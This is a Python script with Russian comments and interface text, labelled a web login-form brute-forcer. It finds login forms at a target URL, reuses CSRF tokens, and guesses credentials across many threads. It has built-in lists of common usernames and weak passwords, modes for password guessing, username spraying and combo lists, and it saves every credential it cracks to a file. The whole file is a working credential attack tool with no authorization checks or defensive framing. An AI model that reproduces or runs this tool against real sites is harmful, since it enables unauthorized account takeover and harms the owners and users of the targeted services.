# -*- coding: utf-8 -*-
import requests
import threading
import time
import os
import sys
import json
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# ЦВЕТА
# ============================================================
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""{Colors.CYAN}
    ╔══════════════════════════════════════════════╗
    ║          WEB BRUTEFORCER v1.0                ║
    ║     Login Form Bruteforce + CSRF Bypass      ║
    ╚══════════════════════════════════════════════╝
    {Colors.RESET}""")

# ============================================================
# БАЗОВЫЕ СЛОВАРИ
# ============================================================
DEFAULT_USERS = [
    'admin', 'administrator', 'root', 'user', 'manager',
    'guest', 'test', 'operator', 'supervisor', 'webmaster',
    'info', 'support', 'office', 'director', 'moderator',
]

DEFAULT_PASSWORDS = [
    'admin', 'admin123', 'admin123456', 'administrator',
    'root', 'root123', 'rootadmin', 'toor',
    'password', 'password123', 'passw0rd', 'p@ssw0rd',
    '123456', '12345678', '123456789', '1234567890',
    'qwerty', 'qwerty123', 'qwe123',
    'test', 'test123', 'guest', 'guest123',
    'letmein', 'welcome', 'monkey', 'dragon',
    'master', 'login', 'secret', 'changeme',
    '1q2w3e4r', '1qaz2wsx', 'zaq12wsx',
    '!@#$%^&*', 'baseball', 'football', 'iloveyou',
    'sunshine', 'princess', 'shadow', 'superman',
    'qazwsx', 'qweasd', 'zxcvbn',
    '111111', '000000', '666666', '777777',
    '1q2w3e', 'qwe123rty', '123qwe', 'qweqwe',
    'pass', 'pass123', 'user', 'user123',
    'sysadmin', 'temp', 'temp123', 'backup',
    'server', 'default', 'blank', 'none', 'null',
]

# ============================================================
# ПАРСЕР ФОРМ
# ============================================================
class FormParser:
    """Находит и анализирует формы входа на странице"""
    
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
    
    def find_login_forms(self, url):
        """Находит формы которые похожи на форму входа"""
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            login_forms = []
            
            for form in forms:
                inputs = form.find_all('input')
                
                # Собираем информацию о полях
                fields = {}
                has_password = False
                has_text = False
                
                for inp in inputs:
                    name = inp.get('name', '')
                    type_ = inp.get('type', 'text').lower()
                    value = inp.get('value', '')
                    placeholder = inp.get('placeholder', '')
                    id_ = inp.get('id', '')
                    
                    if type_ == 'password':
                        has_password = True
                        fields['password_field'] = {
                            'name': name,
                            'id': id_,
                            'placeholder': placeholder
                        }
                    elif type_ in ['text', 'email']:
                        has_text = True
                        # Проверяем похоже ли на логин
                        combined = f"{name} {id_} {placeholder}".lower()
                        if any(kw in combined for kw in ['user', 'login', 'email', 'name', 'account']):
                            fields['username_field'] = {
                                'name': name,
                                'id': id_,
                                'value': value,
                                'placeholder': placeholder
                            }
                        elif 'username_field' not in fields:
                            fields['username_field'] = {
                                'name': name,
                                'id': id_,
                                'value': value,
                                'placeholder': placeholder
                            }
                    elif type_ == 'hidden':
                        fields[f'hidden_{name}'] = {
                            'name': name,
                            'value': value
                        }
                    elif type_ == 'submit':
                        fields['submit_field'] = {
                            'name': name,
                            'value': value
                        }
                
                # Если есть поле пароля и текстовое поле — это форма входа
                if has_password and has_text:
                    form_info = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'POST').upper(),
                        'id': form.get('id', ''),
                        'fields': fields
                    }
                    login_forms.append(form_info)
            
            return login_forms
        
        except Exception as e:
            print(f"  {Colors.RED}[!] Ошибка при анализе формы: {e}{Colors.RESET}")
            return []
    
    def get_csrf_token(self, url):
        """Пытается найти CSRF токен на странице"""
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Ищем скрытые поля с токенами
            tokens = {}
            
            for inp in soup.find_all('input', {'type': 'hidden'}):
                name = (inp.get('name') or '').lower()
                value = inp.get('value', '')
                
                if any(kw in name for kw in ['csrf', 'token', 'nonce', '_wp', 'authenticity']):
                    tokens[name] = value
            
            # Ищем в meta тегах
            for meta in soup.find_all('meta'):
                name = (meta.get('name') or '').lower()
                if 'csrf' in name or 'token' in name:
                    tokens[name] = meta.get('content', '')
            
            return tokens
        
        except Exception:
            return {}


# ============================================================
# БРУТФОРСЕР
# ============================================================
class WebBruteforcer:
    
    def __init__(self, target_url, threads=10, timeout=10, delay=0.5):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        
        self.session = self._create_session()
        self.parser = FormParser(self.session, timeout)
        
        self.results = []
        self.lock = threading.Lock()
        self.attempts = 0
        self.found = False
        self.stop_flag = False
        
        # Ключевые слова для определения успешного входа
        self.success_keywords = [
            'welcome', 'dashboard', 'logout', 'sign out', 'log out',
            'my account', 'profile', 'admin panel', 'control panel',
            'successfully', 'successful', 'вы успешно', 'добро пожаловать',
            'личный кабинет', 'админ панель', 'панель управления',
        ]
        
        # Ключевые слова для определения неудачи
        self.failure_keywords = [
            'invalid', 'incorrect', 'wrong', 'failed', 'error',
            'try again', 'not found', 'does not exist', 'denied',
            'неверный', 'неправильный', 'ошибка', 'не найден',
            'не существует', 'заблокирован', 'попробуйте снова',
        ]
    
    def _create_session(self):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': urlparse(self.target_url).scheme + '://' + urlparse(self.target_url).netloc,
            'Referer': self.target_url,
        })
        return session
    
    def analyze_response(self, response, username, password):
        """Определяет успешность входа по ответу сервера"""
        text_lower = response.text.lower()
        status = response.status_code
        url = response.url.lower()
        original_url = self.target_url.lower()
        
        # Признаки успеха
        success_score = 0
        failure_score = 0
        
        # 1. Редирект на другую страницу
        if url != original_url and 'login' not in url and 'signin' not in url:
            success_score += 30
        
        # 2. Статус-код 302 с редиректом
        if status in [301, 302, 303, 307] and 'Location' in response.headers:
            loc = response.headers['Location'].lower()
            if 'login' not in loc and 'signin' not in loc and 'error' not in loc:
                success_score += 40
        
        # 3. Ключевые слова успеха
        for kw in self.success_keywords:
            if kw in text_lower:
                success_score += 15
                break
        
        # 4. Ключевые слова неудачи
        for kw in self.failure_keywords:
            if kw in text_lower:
                failure_score += 20
                break
        
        # 5. Set-Cookie с сессией
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie'].lower()
            if 'session' in cookie or 'auth' in cookie or 'token' in cookie:
                success_score += 10
        
        # 6. Изменение размера ответа (успешный вход часто короче)
        # Пропускаем, слишком ненадежно
        
        result = {
            'success_likely': success_score > failure_score and success_score >= 30,
            'success_score': success_score,
            'failure_score': failure_score,
            'status_code': status,
            'response_length': len(response.text),
            'redirected': url != original_url,
        }
        
        return result
    
    def try_login(self, username, password, form_info, csrf_tokens):
        """Пробует один логин/пароль"""
        if self.stop_flag:
            return None
        
        with self.lock:
            self.attempts += 1
        
        # Задержка между попытками
        time.sleep(self.delay)
        
        try:
            # Строим URL для отправки
            action = form_info['action']
            if action:
                if action.startswith('http'):
                    login_url = action
                else:
                    login_url = urljoin(self.target_url, action)
            else:
                login_url = self.target_url
            
            # Формируем данные формы
            data = {}
            username_field = form_info['fields'].get('username_field', {})
            password_field = form_info['fields'].get('password_field', {})
            
            if username_field.get('name'):
                data[username_field['name']] = username
            
            if password_field.get('name'):
                data[password_field['name']] = password
            
            # Добавляем скрытые поля
            for key, field in form_info['fields'].items():
                if key.startswith('hidden_') and field.get('name'):
                    # Обновляем CSRF токены если есть
                    if any(kw in field['name'].lower() for kw in ['csrf', 'token', 'nonce']):
                        fresh_tokens = self.parser.get_csrf_token(self.target_url)
                        if fresh_tokens:
                            for tok_name, tok_value in fresh_tokens.items():
                                data[field['name']] = tok_value
                    elif field['name'] not in data:
                        data[field['name']] = field.get('value', '')
            
            # Добавляем свежие CSRF токены
            for tok_name, tok_value in csrf_tokens.items():
                data[tok_name] = tok_value
            
            # Отправляем запрос
            method = form_info.get('method', 'POST')
            
            if method == 'POST':
                resp = self.session.post(
                    login_url,
                    data=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                resp = self.session.get(
                    login_url,
                    params=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            # Анализируем ответ
            analysis = self.analyze_response(resp, username, password)
            
            if analysis['success_likely']:
                with self.lock:
                    self.found = True
                
                return {
                    'username': username,
                    'password': password,
                    'status_code': analysis['status_code'],
                    'response_length': analysis['response_length'],
                    'success_score': analysis['success_score'],
                    'url': resp.url,
                }
            
        except Exception as e:
            pass
        
        return None
    
    def bruteforce_users(self, form_info, usernames, password):
        """Перебирает пользователей с одним паролем"""
        results = []
        
        print(f"\n{Colors.BOLD}[*] Перебор пользователей с паролем: {Colors.YELLOW}{password}{Colors.RESET}")
        print(f"    Пользователей: {len(usernames)}")
        
        csrf_tokens = self.parser.get_csrf_token(self.target_url)
        if csrf_tokens:
            print(f"    {Colors.CYAN}CSRF токены найдены: {list(csrf_tokens.keys())}{Colors.RESET}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for username in usernames:
                future = executor.submit(self.try_login, username, password, form_info, csrf_tokens)
                futures[future] = username
            
            for future in as_completed(futures):
                username = futures[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        with self.lock:
                            print(f"\n  {Colors.GREEN}● НАЙДЕН: {username}:{password}{Colors.RESET}")
                            print(f"    Статус: {result['status_code']}, "
                                  f"Скоринг: {result['success_score']}")
                            print(f"    URL после входа: {result['url']}")
                except Exception:
                    pass
        
        return results
    
    def bruteforce_passwords(self, form_info, username, passwords):
        """Перебирает пароли для одного пользователя"""
        results = []
        
        print(f"\n{Colors.BOLD}[*] Перебор паролей для: {Colors.YELLOW}{username}{Colors.RESET}")
        print(f"    Паролей: {len(passwords)}")
        
        csrf_tokens = self.parser.get_csrf_token(self.target_url)
        if csrf_tokens:
            print(f"    {Colors.CYAN}CSRF токены: {list(csrf_tokens.keys())}{Colors.RESET}")
        
        completed = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for password in passwords:
                future = executor.submit(self.try_login, username, password, form_info, csrf_tokens)
                futures[future] = password
            
            for future in as_completed(futures):
                password = futures[future]
                completed += 1
                
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        with self.lock:
                            print(f"\n  {Colors.GREEN}{'═' * 40}{Colors.RESET}")
                            print(f"  {Colors.GREEN}● УСПЕШНЫЙ ВХОД!{Colors.RESET}")
                            print(f"  {Colors.GREEN}Логин : {username}{Colors.RESET}")
                            print(f"  {Colors.GREEN}Пароль: {password}{Colors.RESET}")
                            print(f"  {Colors.GREEN}{'═' * 40}{Colors.RESET}")
                            self.stop_flag = True
                except Exception:
                    pass
                
                if completed % 10 == 0:
                    print(f"\r{Colors.CYAN}[*] Проверено: {completed}/{len(passwords)}{Colors.RESET}", end='')
        
        print()
        return results
    
    def combo_bruteforce(self, form_info, combos):
        """Перебирает готовые связки логин:пароль"""
        results = []
        
        print(f"\n{Colors.BOLD}[*] Перебор комбинаций: {len(combos)}{Colors.RESET}")
        
        csrf_tokens = self.parser.get_csrf_token(self.target_url)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for username, password in combos:
                future = executor.submit(self.try_login, username, password, form_info, csrf_tokens)
                futures[future] = (username, password)
            
            for future in as_completed(futures):
                username, password = futures[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        with self.lock:
                            print(f"\n  {Colors.GREEN}● {username}:{password}{Colors.RESET}")
                            self.stop_flag = True
                except Exception:
                    pass
        
        return results
    
    def analyze_target(self):
        """Анализирует целевую страницу"""
        print(f"\n{Colors.BOLD}┌─── Анализ цели ───{Colors.RESET}")
        print(f"│ URL: {Colors.GREEN}{self.target_url}{Colors.RESET}")
        
        # Ищем формы
        print(f"│ Поиск форм входа...")
        forms = self.parser.find_login_forms(self.target_url)
        
        if not forms:
            print(f"{Colors.RED}[!] Формы входа не найдены на странице{Colors.RESET}")
            print(f"    Проверьте URL или укажите данные формы вручную")
            return None
        
        print(f"│ Найдено форм: {Colors.GREEN}{len(forms)}{Colors.RESET}")
        
        for i, form in enumerate(forms):
            print(f"\n│ {Colors.BOLD}Форма #{i+1}:{Colors.RESET}")
            print(f"│   Метод  : {form['method']}")
            print(f"│   Action : {form['action'] or '(та же страница)'}")
            
            username_field = form['fields'].get('username_field', {})
            password_field = form['fields'].get('password_field', {})
            
            print(f"│   Логин  : {username_field.get('name', '?')} "
                  f"(placeholder: {username_field.get('placeholder', '-')})")
            print(f"│   Пароль : {password_field.get('name', '?')} "
                  f"(placeholder: {password_field.get('placeholder', '-')})")
            
            hidden_count = sum(1 for k in form['fields'] if k.startswith('hidden_'))
            if hidden_count:
                print(f"│   Скрытых полей: {hidden_count}")
        
        return forms


def load_wordlist(filepath):
    """Загружает словарь из файла"""
    if not os.path.exists(filepath):
        return None
    
    with open(filepath, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]


def save_results(results, target_url):
    """Сохраняет найденные учетные данные"""
    if not results:
        return
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    domain = urlparse(target_url).netloc.replace('.', '_')
    filename = f"creds_{domain}_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write("НАЙДЕННЫЕ УЧЕТНЫЕ ДАННЫЕ\n")
        f.write(f"URL: {target_url}\n")
        f.write(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 50 + "\n\n")
        
        for r in results:
            f.write(f"Логин: {r['username']}\n")
            f.write(f"Пароль: {r['password']}\n")
            f.write(f"Статус: {r['status_code']}\n")
            f.write(f"URL: {r['url']}\n")
            f.write("-" * 30 + "\n")
    
    print(f"\n{Colors.GREEN}[+] Результаты сохранены: {filename}{Colors.RESET}")


def show_menu():
    print(f"\n{Colors.BOLD}Выберите режим:{Colors.RESET}")
    print(f"  {Colors.GREEN}1{Colors.RESET}. Перебор паролей для одного пользователя")
    print(f"  {Colors.GREEN}2{Colors.RESET}. Перебор пользователей с одним паролем")
    print(f"  {Colors.GREEN}3{Colors.RESET}. Перебор связок логин:пароль из файла")
    print(f"  {Colors.GREEN}4{Colors.RESET}. Быстрый перебор (встроенные словари)")
    print(f"  {Colors.GREEN}0{Colors.RESET}. Выход")


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    while True:
        show_menu()
        choice = input(f"\n  {Colors.CYAN}Ваш выбор →{Colors.RESET} ").strip()
        
        if choice == '0':
            print(f"\n{Colors.YELLOW}[*] Выход...{Colors.RESET}")
            break
        
        target_url = input(f"\n{Colors.BOLD}URL страницы входа:{Colors.RESET} ").strip()
        if not target_url:
            print(f"{Colors.RED}[!] URL не введен{Colors.RESET}")
            continue
        
        # Добавляем http:// если нет
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        threads = int(input(f"  Потоков (5-30): ") or "10")
        delay = float(input(f"  Задержка между попытками в секундах (0-2): ") or "0.5")
        
        bruteforcer = WebBruteforcer(target_url, threads=threads, delay=delay)
        forms = bruteforcer.analyze_target()
        
        if not forms:
            input(f"\n{Colors.CYAN}Нажмите Enter...{Colors.RESET}")
            continue
        
        # Выбор формы
        if len(forms) > 1:
            form_idx = int(input(f"\n  Выберите форму (1-{len(forms)}): ") or "1") - 1
        else:
            form_idx = 0
        
        form = forms[form_idx]
        
        results = []
        
        if choice == '1':
            username = input(f"\n  Логин: ").strip()
            if not username:
                continue
            
            wordlist_choice = input(f"  Словарь паролей (1 - встроенный, 2 - из файла): ").strip()
            if wordlist_choice == '2':
                filepath = input(f"  Путь к файлу: ").strip()
                passwords = load_wordlist(filepath)
                if not passwords:
                    print(f"{Colors.RED}[!] Файл не найден{Colors.RESET}")
                    continue
            else:
                passwords = DEFAULT_PASSWORDS
            
            results = bruteforcer.bruteforce_passwords(form, username, passwords)
        
        elif choice == '2':
            password = input(f"\n  Пароль: ").strip()
            if not password:
                continue
            
            wordlist_choice = input(f"  Словарь пользователей (1 - встроенный, 2 - из файла): ").strip()
            if wordlist_choice == '2':
                filepath = input(f"  Путь к файлу: ").strip()
                usernames = load_wordlist(filepath)
                if not usernames:
                    print(f"{Colors.RED}[!] Файл не найден{Colors.RESET}")
                    continue
            else:
                usernames = DEFAULT_USERS
            
            results = bruteforcer.bruteforce_users(form, usernames, password)
        
        elif choice == '3':
            filepath = input(f"\n  Путь к файлу (формат: логин:пароль): ").strip()
            combos = []
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if ':' in line:
                            user, pwd = line.split(':', 1)
                            combos.append((user.strip(), pwd.strip()))
            
            if not combos:
                print(f"{Colors.RED}[!] Не удалось загрузить связки{Colors.RESET}")
                continue
            
            results = bruteforcer.combo_bruteforce(form, combos)
        
        elif choice == '4':
            print(f"\n{Colors.BOLD}[*] Быстрый перебор популярных связок...{Colors.RESET}")
            # Генерируем связки из встроенных словарей
            combos = []
            for user in DEFAULT_USERS[:5]:
                for pwd in DEFAULT_PASSWORDS[:10]:
                    combos.append((user, pwd))
            # Добавляем одинаковые логин=пароль
            for same in ['admin', 'root', 'guest', 'test']:
                combos.append((same, same))
            
            results = bruteforcer.combo_bruteforce(form, combos)
        
        # Итоги
        print(f"\n{Colors.BOLD}{'═' * 50}{Colors.RESET}")
        if results:
            print(f"{Colors.GREEN}[+] Найдено учетных данных: {len(results)}{Colors.RESET}")
            for r in results:
                print(f"    {r['username']}:{r['password']}")
            save_results(results, target_url)
        else:
            print(f"{Colors.YELLOW}[-] Учетные данные не найдены{Colors.RESET}")
            print(f"    Проверено попыток: {bruteforcer.attempts}")
        
        input(f"\n{Colors.CYAN}Нажмите Enter...{Colors.RESET}")
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()

if __name__ == '__main__':
    main()
